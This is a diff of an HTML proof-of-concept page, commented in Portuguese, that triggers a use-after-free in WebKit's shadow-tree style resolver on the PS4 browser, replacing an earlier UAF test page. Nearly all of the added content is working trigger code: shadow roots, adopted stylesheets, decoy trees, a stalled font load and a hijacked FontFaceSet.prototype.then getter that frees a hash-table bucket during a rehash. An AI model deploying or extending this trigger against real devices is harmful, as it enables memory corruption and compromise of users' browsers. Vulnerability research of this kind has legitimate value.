@@ -1,65 +1,256 @@
+
+<!DOCTYPE html>
+<!--
+  UAF: Style::Scope::createOrFindSharedShadowTreeResolver
+  =========================================================
+  Commit fix : eaafed06dee58cbedb5e2c6a3fcae8da7d16610d
+  Bug        : https://bugs.webkit.org/show_bug.cgi?id=324735
+  Target     : PS4 libSceNKWebKit.sprx / AppleWebKit 605.1.15 FW 14.00
+-->
 <html>
 <head>
-<script>
-function forceGC() {
-    function gcRec(n) {
-          if (n < 1)
-              return {};
-          var temp = {i: "ab" + i + (i / 100000)};
-          temp += "foo";
-          gcRec(n-1);
-    }
-    for (var i = 0; i < 10000; i++)
-    gcRec(10);
-}
-
-async function magic() {
-  frame.remove();
-  document.body.innerHTML = '<p>Se você está vendo este texto, o select e o iframe foram removidos sem crash.</p>';
-  forceGC();
-}
-
-function test() {
-  var select = outerContainer.querySelector('select');
-  var input  = outerContainer.querySelector('input');  // ? sem depender de índice
-
-  if (!input) {
-    document.body.innerHTML = '<p>ERRO: input não encontrado no shadow DOM.</p>';
-    return;
-  }
-
-  input.addEventListener('blur', magic);
-  input.focus();
-
-  // Tenta acionar via access key sintético (pode ou não funcionar no PS4)
-  document.dispatchEvent(new KeyboardEvent('keydown', {
-    bubbles: true,
-    cancelable: true,
-    view: window,
-    key: 'a',
-    code: 'KeyA',
-    altKey: true,
-    keyIdentifier: 'U+0041'
-  }));
-
-  // Fallback: foca direto no select para acionar o blur?magic
-  if (document.activeElement !== select) {
-    select.focus();
-  }
-}
-</script>
+<meta charset="utf-8">
+<title>UAF eaafed0 PoC (Adaptado)</title>
+<style>
+body{font-family:monospace;background:#111;color:#ccc;padding:10px}
+h2{color:#8cf}
+pre{background:#1a1a1a;padding:8px;border:1px solid #333}
+.ok{color:#4e4} .fail{color:#e44} .warn{color:#ea4}
+#log{background:#0a0a0a;padding:8px;border:1px solid #444;min-height:80px}
+</style>
 </head>
-<body onload="test()">
-<p>Teste: access key / select destroy no PS4</p>
+<body>
+<h2>UAF eaafed0 â€” Style::Scope::createOrFindSharedShadowTreeResolver</h2>
+<p>Vulnerabilidade: HashMap::ensure() pinned bucket freed por rehash via FontFaceSet.prototype.then getter</p>
+<pre id="log">Inicializando...</pre>
+
 <script>
-  frame = document.body.appendChild(document.createElement('iframe'));
-  frame.style = 'width: 100%; height: 100%; border: 0';
-  outerContainer = frame.contentDocument.body.attachShadow({ mode: 'open' });
-  outerContainer.innerHTML = `<select accesskey="a"><option>SouthSea</option></select>
-<p>Made in the body</p>
-<input>`;
-  outerContainer.querySelector('input').addEventListener('blur', magic);
-  outerContainer.querySelector('input').focus();
+// ============================================================
+// CONFIGURACAO â€” URL RELATIVA PARA MANTER STATUS "LOADING"
+// ============================================================
+// SubstituÃ­do o IP externo por url("no-such-font.otf"), garantindo
+// que o WebKit no PS4 inicie o carregamento assÃ­ncrono mantendo o 'loading'.
+var STALL_URL = 'no-such-font.otf';
+
+var DECOY_COUNT = 32;
+
+var logEl = document.getElementById('log');
+function log(msg, cls) {
+    var line = document.createElement('div');
+    line.className = cls || '';
+    line.textContent = msg;
+    logEl.appendChild(line);
+}
+
+// ============================================================
+// FASE 1: DIAGNOSTICO â€” FontFaceSet.prototype.then getter
+// ============================================================
+function checkFontFaceSetGetter() {
+    log('--- Fase 1: Diagnostico ---');
+
+    if (typeof FontFaceSet === 'undefined') {
+        log('FAIL: FontFaceSet nao existe', 'fail'); return false;
+    }
+    log('FontFaceSet disponivel', 'ok');
+
+    if (!(document.fonts instanceof FontFaceSet)) {
+        log('FAIL: document.fonts nao eh FontFaceSet', 'fail'); return false;
+    }
+    log('document.fonts instanceof FontFaceSet', 'ok');
+
+    var getterFired = false;
+    var origThen = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
+    try {
+        Object.defineProperty(FontFaceSet.prototype, 'then', {
+            configurable: true,
+            get: function() { getterFired = true; return undefined; }
+        });
+    } catch(e) {
+        log('FAIL: defineProperty em FontFaceSet.prototype.then: ' + e.message, 'fail');
+        return false;
+    }
+    log('defineProperty em FontFaceSet.prototype.then: OK', 'ok');
+
+    void document.fonts.then;
+    log('Getter dispara no acesso direto: ' + getterFired, getterFired ? 'ok' : 'fail');
+
+    if (origThen) {
+        Object.defineProperty(FontFaceSet.prototype, 'then', origThen);
+    } else {
+        try { delete FontFaceSet.prototype.then; } catch(e) {}
+    }
+
+    var testHost = document.createElement('div');
+    document.body.appendChild(testHost);
+    var testRoot = testHost.attachShadow({ mode: 'open' });
+    var hasAdopted = 'adoptedStyleSheets' in testRoot;
+    testHost.remove();
+    log('adoptedStyleSheets disponivel: ' + hasAdopted, hasAdopted ? 'ok' : 'fail');
+
+    var hasCSS = false;
+    try { new CSSStyleSheet(); hasCSS = true; } catch(e) {}
+    log('new CSSStyleSheet(): ' + hasCSS, hasCSS ? 'ok' : 'fail');
+
+    return getterFired && hasAdopted && hasCSS;
+}
+
+// ============================================================
+// FASE 2: SETUP â€” shadow trees + adopted stylesheets
+// ============================================================
+function setup() {
+    log('--- Fase 2: Setup ---');
+
+    void document.fonts;
+
+    var fontSheet = new CSSStyleSheet();
+    try {
+        fontSheet.replaceSync(
+            '@font-face { font-family: StallingFont; src: url("' + STALL_URL + '"); }'
+        );
+    } catch(e) {
+        log('FAIL: replaceSync: ' + e.message, 'fail'); return null;
+    }
+    log('fontSheet criado com @font-face url("no-such-font.otf")', 'ok');
+
+    var extraSheet = new CSSStyleSheet();
+    extraSheet.replaceSync('.mk { color: green; }');
+
+    var decoySheets = [];
+    for (var i = 0; i < DECOY_COUNT; i++) {
+        var ds = new CSSStyleSheet();
+        ds.replaceSync('.d' + i + ' { color: rgb(' + i + ',1,2); }');
+        decoySheets.push(ds);
+    }
+
+    var hostA = document.createElement('div');
+    document.body.appendChild(hostA);
+    var rootA = hostA.attachShadow({ mode: 'open' });
+    rootA.adoptedStyleSheets = [fontSheet];
+    var probeA = document.createElement('span');
+    probeA.style.font = '24px StallingFont';
+    probeA.textContent = 'A';
+    rootA.appendChild(probeA);
+    log('Shadow tree A criado (usa StallingFont)', 'ok');
+
+    var hostB = document.createElement('div');
+    hostB.style.display = 'none';
+    document.body.appendChild(hostB);
+    var rootB = hostB.attachShadow({ mode: 'open' });
+    var gadgetStyle = document.createElement('style');
+    gadgetStyle.textContent = '.gadget { color: navy; }';
+    rootB.appendChild(gadgetStyle);
+    var wrapperB = document.createElement('div');
+    var elementB = document.createElement('span');
+    elementB.textContent = 'B';
+    wrapperB.appendChild(elementB);
+    rootB.appendChild(wrapperB);
+    rootB.adoptedStyleSheets = [fontSheet, extraSheet];
+    log('Shadow tree B criado (compartilha fontSheet com A)', 'ok');
+
+    var decoyRoots = [];
+    var decoyStyles = [];
+    for (var j = 0; j < DECOY_COUNT; j++) {
+        var dh = document.createElement('div');
+        dh.style.display = 'none';
+        document.body.appendChild(dh);
+        var dr = dh.attachShadow({ mode: 'open' });
+        var dsEl = document.createElement('style');
+        dsEl.textContent = '.dg' + j + ' { color: rgb(1,' + j + ',3); }';
+        dr.appendChild(dsEl);
+        dr.appendChild(document.createElement('div'));
+        decoyRoots.push(dr);
+        decoyStyles.push(dsEl);
+    }
+    log('32 shadow trees decoy criados', 'ok');
+
+    void document.body.offsetHeight;
+    log('Layout forcado â€” resolvers construidos', 'ok');
+
+    document.fonts.load('24px StallingFont', 'A');
+
+    var status = document.fonts.status;
+    log('document.fonts.status: ' + status, status === 'loading' ? 'ok' : 'fail');
+
+    if (status !== 'loading') {
+        log('FAIL: fonte nao ficou em "loading"', 'fail');
+        return null;
+    }
+    log('Status "loading" confirmado com sucesso!', 'ok');
+
+    var readyPromise = document.fonts.ready;
+    log('document.fonts.ready materializado', 'ok');
+
+    return {
+        gadgetStyle: gadgetStyle,
+        elementB: elementB,
+        decoyRoots: decoyRoots,
+        decoyStyles: decoyStyles,
+        decoySheets: decoySheets
+    };
+}
+
+// ============================================================
+// FASE 3: TRIGGER â€” reconstroi resolver â†’ UAF
+// ============================================================
+function trigger(state) {
+    log('--- Fase 3: Trigger ---');
+
+    var gadgetStyle = state.gadgetStyle;
+    var elementB    = state.elementB;
+    var decoyRoots  = state.decoyRoots;
+    var decoyStyles = state.decoyStyles;
+    var decoySheets = state.decoySheets;
+
+    var origThen = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
+    Object.defineProperty(FontFaceSet.prototype, 'then', {
+        configurable: true,
+        get: function() {
+            if (origThen) {
+                Object.defineProperty(FontFaceSet.prototype, 'then', origThen);
+            } else {
+                try { delete FontFaceSet.prototype.then; } catch(e) {}
+            }
+            void document.body.offsetHeight;
+            return undefined;
+        }
+    });
+    log('FontFaceSet.prototype.then getter instalado', 'ok');
+
+    for (var i = 0; i < DECOY_COUNT; i++) {
+        decoyRoots[i].adoptedStyleSheets = [decoySheets[i]];
+        decoyStyles[i].remove();
+    }
+    gadgetStyle.remove();
+    log('Estilo gadget removido + decoys invalidados', 'ok');
+
+    void document.styleSheets.length;
+    log('Flush realizado â€” resolvers descartados', 'ok');
+
+    log('Disparando trigger: elementB.id = "boom"', 'warn');
+    elementB.id = 'boom';
+    log('Trigger disparado', 'warn');
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        var diagOk = checkFontFaceSetGetter();
+        if (!diagOk) {
+            log('Diagnostico falhou', 'fail');
+            return;
+        }
+        log('Diagnostico OK', 'ok');
+
+        var state = setup();
+        if (!state) return;
+
+        setTimeout(function() {
+            trigger(state);
+        }, 0);
+    }, 0);
+});
 </script>
 </body>
 </html>
